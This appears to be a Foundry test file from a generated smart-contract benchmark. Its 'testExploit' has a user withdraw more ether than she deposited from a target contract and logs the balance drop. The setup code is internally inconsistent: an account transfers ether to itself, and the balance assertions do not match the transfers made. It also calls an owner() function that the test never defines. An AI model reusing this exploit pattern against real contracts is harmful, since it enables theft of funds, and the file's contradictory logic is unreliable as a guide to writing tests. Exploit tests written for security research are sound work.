// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/62ce34ec-b052-4104-990f-02b196829969_Mixed.sol";

contract MixedTestExploit is BaseTestWithBalanceLog {
    MixedTest target;

    function setUp() public {
        target = new MixedTest();
        vm.startPrank(alice);

        // Transfer some funds to the contract and the attacker
        (bool success,) = address(target).call{value: 10 ether}("");
        require(success);
        (success,) = alice.call{value: 5 ether}("");
        require(success);

        target.deposit{value: 5 ether}();

        assertEq(address(this).balance, 5 ether);
        assertEq(alice.balance, 5 ether + 10 ether);

        vm.stopPrank();
    }

    function testExploit() public  balanceLog {
        console.log("Contract balance before exploit:", address(target).balance);
        vm.startPrank(alice);

        // Try to withdraw more funds than the contract holds
        target.withdraw(15 ether);

        vm.stopPrank();

        console.log("Contract balance after exploit:", address(target).balance);
        assertEq(address(this).balance - target.balanceOf(owner()), 0);
    }
}